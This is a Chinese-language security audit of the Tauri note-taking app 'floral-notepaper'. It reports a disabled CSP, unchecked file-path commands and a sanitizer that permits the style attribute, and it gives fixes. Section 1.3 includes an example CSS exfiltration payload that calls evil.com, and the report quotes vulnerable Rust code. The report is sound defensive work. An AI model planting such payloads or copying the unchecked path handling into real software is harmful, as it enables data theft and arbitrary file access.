## 总体结论

**花笺是一款干净的、尊重隐私的本地桌面应用。** 未发现后门、恶意代码、病毒、遥测或数据外传。所有网络通信仅用于更新检查和下载，有主机白名单限制。敏感数据（CDK token）使用 OS 原生密钥链保护。

**必须立即修复的安全问题：**
1. CSP 被设为 `null`（完全禁用内容安全策略）
2. 7 个 Tauri 命令接受未验证的用户路径（路径遍历风险）
3. Markdown sanitize schema 允许 `style` 属性（CSS 注入向量）

## 一、严重安全问题

### 1.1 CSP 被完全禁用 — 🔴 CRITICAL

**文件**: `upstream_src/floral-notepaper-main/src-tauri/tauri.conf.json:27`

```json
"security": {
  "csp": null,  // ← CSP 设为 null = 无任何内容安全策略
  "assetProtocol": { "enable": true, "scope": [] }
}
```

**证据**: Tauri v2 文档明确规定 `csp: null` 表示不发送 CSP 头。这意味着 WebView 没有任何脚本来源限制。

**影响**: 
- 结合 `rehype-raw`（允许 Markdown 中的原始 HTML），攻击者可通过恶意 `.md` 文件在 WebView 中执行任意 JavaScript
- XSS 可突破 WebView 沙箱限制，调用 Tauri 命令

**修复建议**:
```json
"csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; connect-src 'self' https://mirrorchyan.com https://api.github.com"
```

---

### 1.2 多个 Tauri 命令无路径校验 — 🔴 CRITICAL

以下 7 个命令接受前端传入任意文件路径，直接调用文件系统 API，**无任何路径遍历防护**：

| 命令 | 文件:行号 | 操作 | 风险 |
|------|-----------|------|------|
| `read_external_file` | `src-tauri/src/lib.rs:67-73` | `std::fs::read_to_string(&path)` | 读取任意系统文件 |
| `save_external_file` | `src-tauri/src/lib.rs:94-107` | `std::fs::write(&path, content)` + `create_dir_all` | 写入任意位置 |
| `get_file_modified_time` | `src-tauri/src/lib.rs:76-91` | `std::fs::metadata(&path)` | 读取文件元数据 |
| `images_save_from_path` | `src-tauri/src/lib.rs:151-161` | `std::fs::read(&path)` | 复制任意文件到应用目录 |
| `notes_import_markdown` | `src-tauri/src/lib.rs:50-59` | `PathBuf::from(path)` | 导入 Markdown 文件 |
| `notes_export_markdown` | `src-tauri/src/lib.rs:62-64` | `PathBuf::from(path)` | 导出笔记到任意路径 |
| `copy_background_image` | `src-tauri/src/lib.rs:188-223` | `fs::copy(&source, &dest)` | 复制任意文件为背景图 |

**证据** — 以 `read_external_file` 为例：
```rust
// src-tauri/src/lib.rs:67-73
#[tauri::command]
fn read_external_file(path: String) -> Result<String, AppError> {
    std::fs::read_to_string(&path).map_err(|e| AppError {  // ← 直接使用前端传入的 path
        code: "io".into(),
        message: e.to_string(),
        details: Default::default(),
    })
}
```

**影响**: 前端任何 XSS（结合 CSP 禁用后极其可能）可读写用户系统上的任意文件。

**修复建议**: 每个命令使用 `std::fs::canonicalize()` + 白名单目录校验，或限制在 Tauri 资源目录内。

### 1.3 CSS 注入向量 — 🔴 CRITICAL

**文件**: `upstream_src/floral-notepaper-main/src/features/markdown/MarkdownPreview.tsx:77-87`

```typescript
const sanitizeSchema = {
  ...defaultSchema,
  tagNames: [...(defaultSchema.tagNames ?? []), "mark", "center", "font", "u", "abbr"],
  attributes: {
    ...defaultSchema.attributes,
    "*": [
      ...(defaultSchema.attributes?.["*"] ?? []),
      "style",    // ← 允许所有元素使用 style 属性
      "className",
    ],
  },
};
```

**证据**: `rehype-sanitize` 的 `defaultSchema` 本身不允许 `style` 属性。此处显式在所有元素 (`"*"`) 上开放了 `style`。

**影响**: 当 `renderHtmlMarkdown` 开启时（关闭时不影响），攻击者可通过 CSS 实现：
- 数据外泄：`style="background-image:url(https://evil.com/steal?data=...)"`
- UI 欺骗：CSS 定位覆盖界面元素

**修复建议**: 从 `"*"` 的属性列表中移除 `"style"`，或使用 CSS 过滤器仅允许安全的颜色/字体属性。

## 二、重要设计缺陷

### 2.1 无 React Error Boundary — 🟠 MAJOR

**文件**: 全量 79 个组件文件

**证据**: 全仓库搜索 `ErrorBoundary`、`componentDidCatch`、`getDerivedStateFromError` — **零结果**。

**影响**: 任何组件未捕获异常 → 整个 Tauri 应用白屏崩溃。`MarkdownPreview` 组件有大量不安全类型转换，崩溃风险较高。

**修复建议**: 在 `main.tsx` 中为 `<App />` 添加 Error Boundary。

---

### 2.2 Cargo.lock 未提交仓库 — 🟠 MAJOR

**文件**: `upstream_src/floral-notepaper-main/src-tauri/`

**证据**: 仓库中无 `src-tauri/Cargo.lock` 文件。

**影响**: CI 与本地构建可能解析不同传递依赖版本，破坏可审计性与可复现构建。

**修复建议**: 提交 `src-tauri/Cargo.lock` 到版本控制。

---

### 2.3 CDK Token 在 URL 查询参数中传递 — 🟠 MAJOR

**文件**: `upstream_src/floral-notepaper-main/src-tauri/src/updater/check.rs:576-577`

```rust
if let Some(cdk) = cdk.filter(|s| !s.trim().is_empty()) {
    url.query_pairs_mut().append_pair("cdk", cdk);  // ← CDK token 作为 URL 查询参数
}
```

**影响**: MirrorChyan 的 CDK token 出现在 URL 查询字符串中，尽管 HTTPS 加密传输，token 可能出现在：
- MirrorChyan 服务器日志
- 中间代理日志
- CDN 缓存日志

**代码中已有安全注意**: `check.rs:1438-1444` 的测试验证了错误消息中不包含 CDK token：

```rust
fn mirror_chyan_request_error_message_does_not_include_sensitive_url() {
    let error = Client::new()
        .get("http://127.0.0.1:0/latest?cdk=secret-token")
        .send()
        .expect_err("invalid URL should fail before network I/O");
    let message = mirror_chyan_request_error_message(&error);
    assert!(!message.contains("secret-token"));
    assert!(!message.contains("cdk="));
    assert!(!message.contains("127.0.0.1"));
}
```

**修复建议**: 改为 HTTP Header（如 `Authorization: Bearer <cdk>`）。

### 3.8 更新机制安全审计

#### 更新流程

```
用户设置 → 定时器(60s轮询) → 检查更新 → 下载 → SHA-256验证 → 安装
```

#### 安全设计点

**1. 下载主机白名单** (`download.rs:42-48`):
```rust
const DOWNLOAD_HOST_ALLOWLIST: &[&str] = &[
    "mirrorchyan.com", "www.mirrorchyan.com",
    "github.com", "objects.githubusercontent.com", "release-assets.githubusercontent.com",
];
```

**2. SHA-256 完整性验证** (`download.rs:717-733`):
```rust
// GitHub 源强制 SHA-256 验证
if let Some(ref expected) = plan.asset_sha256 {
    if actual_sha256 != *expected {
        return Err(hash_mismatch_error(expected, &actual_sha256));
    }
}
// 若 GitHub 源缺少 SHA-256 → 硬错误
else if !plan.sha256_verification_enabled {
    // 仅 MirrorChyan 在此分支（API 不返回 checksum）
} else {
    return Err(errors::app_error("updateDownloadMissingSha256", "缺少 SHA-256 校验值"));
}
```

**3. 内容大小验证** (`download.rs:645-654, 708-710`):
```rust
if let Some(length) = content_length {
    if length != plan.asset_size {
        return Err(size_mismatch_error(plan.asset_size, length));
    }
}
// 下载完成后二次验证
if plan.asset_size > 0 && downloaded_bytes != plan.asset_size {
    return Err(size_mismatch_error(plan.asset_size, downloaded_bytes));
}
```

**4. 原子写入**: 下载到 `.part` 临时文件，验证通过后 `fs::rename` 到最终路径。

**5. 重试机制**: 下载失败最多重试 3 次，延迟递增（1s/3s/8s）。

#### ⚠️ 已知弱点: MirrorChyan 源无 SHA-256

因为 MirrorChyan API 不返回 asset checksum，该源的下载仅依赖 HTTPS 传输完整性 + 大小验证。代码中有明确注释：

```rust
// download.rs:713-716
// MirrorChyan API does not provide asset SHA-256 checksums, so verification
// is explicitly disabled for MirrorChyan-sourced downloads.
```

**影响评估**: 低 — 需要同时攻破 MirrorChyan 服务器或 DNS。GitHub 源不受影响。

**结论**: ✅ **更新机制设计良好。GitHub 源有完整 SHA-256+大小双重验证。MirrorChyan 源建议上游增加 checksum 返回。**

## 五、值得肯定的设计

- **原子 JSON 写入** — `json_io.rs` 使用 `write_json_atomic` + 临时文件 + `persist()` 防止写入中断损坏数据

- **CDK 使用 OS 原生密钥链** — `keyring` crate，非明文文件存储
- **下载失败优雅退避** — 3 次重试 + 指数延迟
- **合理的 `unsafe` 使用** — 所有 unsafe 块集中在平台特定 API，均有注释说明
- **贡献者脚本容错** — 网络失败不阻塞构建
- **`TerminateProcess` 注释充分** — 明确解释跳过 DLL detach 的原因
- **pre-commit hooks** — husky + lint-staged + oxfmt/cargo fmt
